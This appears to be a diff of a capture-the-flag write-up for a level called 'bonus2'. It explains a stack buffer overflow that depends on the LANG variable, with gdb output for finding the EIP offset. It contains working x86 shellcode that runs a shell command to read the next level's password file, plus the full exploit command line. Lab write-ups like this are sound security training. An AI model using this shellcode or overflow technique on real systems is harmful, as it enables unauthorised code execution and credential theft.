@@ -1,4 +1,28 @@
-Exploit:
-export LANG="fi"
+The binary get the "LANG" param in the env and depending on the statuts of "LANG" 
+concatenates a string with argv[1]. Then puts the result.
+
+The goal is to execute a shellcode. 
+
 export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus3/.pass;exit;"'`
-./bonus2 `python -c 'print "z"*500'` `python -c 'print "aa" + "\xdc\xf7\xff\xbf"*30'`
+shellcode address : 0xbffff798
+
+Now we need to find the number of char needed to rewrite the eip.
+ in gdb by run with `python -c 'print "A"*500'` `python -c 'print "B"*500'`
+ we get that : 
+
+(gdb) info frame
+Stack level 0, frame at 0xbffff0e0:
+ eip = 0x804851c in greetuser; saved eip 0x8004242
+ called by frame at 0xbffff0e4
+ Arglist at 0xbffff0d8, args:
+ Locals at 0xbffff0d8, Previous frame's sp is 0xbffff0e0
+ Saved registers:
+  ebp at 0xbffff0d8, eip at 0xbffff0dc
+(gdb)
+We see that the eip is rewrite but to half.
+
+To rewrite the eip in full we have to change the "LANG" in fi or nl because the buffer is bugger so we can write more.
+
+ export LANG="fi"
+
+ exploit : ./bonus2 `python -c 'print "z"*500'` `python -c 'print "aa" + "\xdc\xf7\xff\xbf"*30'`
